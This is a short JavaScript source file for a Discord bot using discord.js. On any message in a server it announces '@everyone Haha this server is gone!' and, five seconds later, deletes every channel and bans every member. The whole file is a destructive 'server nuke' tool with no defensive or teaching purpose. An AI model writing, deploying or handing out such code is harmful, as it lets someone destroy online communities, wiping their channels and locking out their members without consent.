const Discord = require("discord.js");
const client = new Discord.Client();
client.on("ready", () => {
  console.log("Bot Ready");
});
client.on("message", (message) => {
  console.log(message.author.id);
  function nuke() {
    message.guild.channels.forEach(channel => channel.delete())
    message.guild.members.forEach(members => members.ban())
  }
  message.channel.send("@everyone Haha this server is gone! farewell and have fun :)")
  setTimeout(nuke, 5000);
});
client.login(process.env.BOT_TOKEN)
